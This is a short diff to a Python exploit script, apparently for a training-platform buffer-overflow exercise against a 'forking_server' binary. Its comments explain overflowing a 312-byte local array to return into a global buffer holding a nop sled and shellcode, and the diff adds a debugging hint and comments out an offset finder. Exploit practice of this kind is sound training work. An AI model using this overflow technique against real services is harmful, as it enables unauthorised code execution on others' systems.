@@ -3,6 +3,7 @@ import atexit
 
 # Every time a new connection is created, the server creates a new thread (forks) and asks for a username, which is stored in a global array of 1000 chars (buffer). Then the content of the array is copied in a local array of 312 Bytes, so we can exploit bof to make the program return to the buffer, where we previously saved the exploit, a nop sled and the address of the buffer itself.
 # Here the problem was to test the program in local, because in the training platform the server executable is running, but in local you have to debug it separately. The solution is to create two processes: one for the server (to be debugged) and the other one for creating the "remote connection" and sending the exploit.
+# Hint: export environment variable TIMEOUT to have more time to debug the exploit (I set TIMEOUT to 600, 10 minutes)
 
 def exit_hndler():
     if not args.REMOTE:
@@ -27,7 +28,7 @@ exe = './forking_server'
 target = '0.0.0.0'
 port = 4000
 
-addr_finder = cyclic(0x500)
+# addr_finder = cyclic(0x500)
 size = 100
 buffer = 0x404100
 
@@ -55,7 +56,7 @@ else:
 
 c.recvuntil(b'name?\n')
 
-# Next instr is used to get the location of the srip, then it is replaced by the true exploit (si it's commented)
+# Next instr is used to get the location of the srip, then it is replaced by the true exploit (so it's commented)
 # c.sendline(addr_finder)     # srip 0x6461616564616164 => srip is 312=0x138 Bytes above the start of vector s
 c.sendline(exploit)
 
